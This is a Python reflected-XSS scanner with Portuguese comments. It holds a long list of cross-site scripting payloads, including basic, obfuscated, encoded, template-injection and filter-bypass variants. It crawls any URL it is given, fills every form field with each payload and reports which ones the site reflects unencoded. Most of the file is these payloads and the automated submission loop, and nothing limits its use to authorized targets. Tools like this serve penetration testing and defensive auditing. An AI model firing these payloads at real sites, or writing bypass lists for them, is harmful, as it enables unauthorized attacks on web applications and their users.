import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Cores para terminal (ANSI)
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

# Lista extensa de payloads XSS (incluindo ofuscados)
payloads = [
    # Payloads básicos
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<math><mtext></mtext><annotation encoding='application/x-xml'>"
    "<script>alert(1)</script></annotation></math>",
    "<a href='javascript:alert(1)'>Clique</a>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<video><source onerror='alert(1)'></video>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<isindex type=image src=1 onerror=alert(1)>",
    
    # Payloads ofuscados
    "<script>eval('al'+'ert(1)')</script>",
    "<img src=x:expression(alert(1))>",  # IE antigo
    "<div style=\"x:expression(alert(1))\">",
    "<a href=\"javas&#99;ript:alert(1)\">XSS</a>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<img src=\"x\" onerror=\"javascript:alert(1)\">",
    "<div onmouseover=\"alert(1)\">Passe o mouse</div>",
    "<marquee onstart=alert(1)>",
    "<svg><script>alert&#40;1&#41</script>",
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    "<script src=\"data:text/javascript,alert(1)\"></script>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    
    # Payloads avançados/ofuscados
    "<script>window['al'+'ert'](window['doc'+'ument']['dom'+'ain'])</script>",
    "<script>Function('ale'+'rt(1)')()</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>new Function`al\\ert\\`1\\```</script>",
    "<script>top['al\u0065rt'](1)</script>",
    "<script>['al'+'ert'].map(eval)[0](1)</script>",
    "<script>alert.call(null,1)</script>",
    "<script>alert.apply(null,[1])</script>",
    "<script>[(alert)(1)]</script>",
    "<script>~[]['filter']['constructor']('alert(1)')()</script>",
    
    # Payloads com encoding
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
    "%27%3E%3Cscript%3Ealert(1)%3C/script%3E",
    "javascript:alert(1)",
    "jav&#x09;ascript:alert(1)",
    "jav&#x0A;ascript:alert(1)",
    "jav&#x0D;ascript:alert(1)",
    
    # Payloads para eventos HTML
    "<img src=x oneonerrorrror=alert(1)>",  # Técnica de duplicação de atributo
    "<img src=x:alert(1)//",
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror=alert(1) //",
    "<img src=x onerror=alert&lpar;1&rpar;>",
    "<img src=x onerror='alert(1)'>",
    "<img src=x onerror=\"alert(1)\">",
    "<img src=x onerror=alert(String.fromCharCode(49))>",
    
    # Payloads para contextos específicos
    "{{constructor.constructor('alert(1)')()}}",  # Para templates JS
    "<%= alert(1) %>",  # Para templates server-side
    "${alert(1)}",  # Para templates JS modernos
    "#{alert(1)}",  # Para Ruby templates
    "<!--#exec cmd='alert(1)'-->",  # Para SSI
    "<?xml version='1.0'?><html><script>alert(1);</script></html>",
    
    # Payloads para bypass de filtros
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<scri\x00pt>alert(1)</scri\x00pt>",
    "<scri\x0Apt>alert(1)</scri\x0Apt>",
    "<scri\x0Dpt>alert(1)</scri\x0Dpt>",
    "<scri\x09pt>alert(1)</scri\x09pt>",
    "<img src=x oneonerrorrror=alert(1)>",
    "<a href=javascript:alert`1`>XSS</a>",
    "<a href=javascript:alert(1)//'>XSS</a>",
    "<a href=javascript:alert(1)%0A>XSS</a>",
    "<a href=javascript:alert(1)%0D>XSS</a>"
]

# Função para encontrar formulários
def encontrar_formularios(url):
    print(f"{CYAN}[+] Procurando formulários em: {url}{RESET}")
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException as e:
        print(f"{RED}[!] Erro ao acessar a URL: {e}{RESET}")
        return []

# Função para extrair dados dos formulários
def obter_dados_formulario(form):
    dados = {}
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all(["input", "textarea", "select"])

    for input_tag in inputs:
        nome = input_tag.get("name")
        if nome:
            tipo = input_tag.get("type", "text")
            valor = input_tag.get("value", "")
            dados[nome] = valor

    return action, method, dados

# Função para verificar se o payload foi refletido
def verificar_reflexao(resposta, payload):
    # Verifica se o payload aparece na resposta de forma não codificada
    return payload in resposta.text

# Função principal de teste
def testar_xss(url):
    formularios = encontrar_formularios(url)
    if not formularios:
        print(f"{YELLOW}[-] Nenhum formulário encontrado.{RESET}")
        return

    for i, form in enumerate(formularios, start=1):
        print(f"\n{CYAN}[#] Testando formulário {i}/{len(formularios)}{RESET}")
        action, method, dados = obter_dados_formulario(form)
        url_destino = urljoin(url, action)

        print(f"    URL do formulário: {url_destino}")
        print(f"    Método: {method.upper()}")
        print(f"    Campos: {', '.join(dados.keys()) if dados else 'Nenhum'}")
        print(f"{MAGENTA}    Iniciando testes XSS...{RESET}")

        for payload in payloads:
            dados_testados = {k: payload for k in dados}

            print(f"\n    {YELLOW}Payload completo:{RESET} {payload}")
            print(f"    -> Testando em campos: {', '.join(dados_testados.keys())}", end=" ")
            
            try:
                if method == "post":
                    res = requests.post(url_destino, data=dados_testados, timeout=15)
                else:
                    res = requests.get(url_destino, params=dados_testados, timeout=15)
                
                if verificar_reflexao(res, payload):
                    print(f"\n{RED}[XSS DETECTADO]{RESET} {YELLOW}(Status {res.status_code}){RESET}")
                    print(f"        ↳ Payload refletido na resposta")
                    print(f"        ↳ Método: {method.upper()}")
                    print(f"        ↳ URL: {res.url}")
                else:
                    print(f"{GREEN}[Sem reflexão detectada]{RESET}")
                    
            except requests.RequestException as e:
                print(f"{RED}[Erro na requisição]{RESET}: {e}")

# Execução principal
if __name__ == "__main__":
    print(f"{CYAN}\n=== XSS Scanner ==={RESET}")
    url = input("Digite a URL para escanear XSS: ").strip()
    testar_xss(url)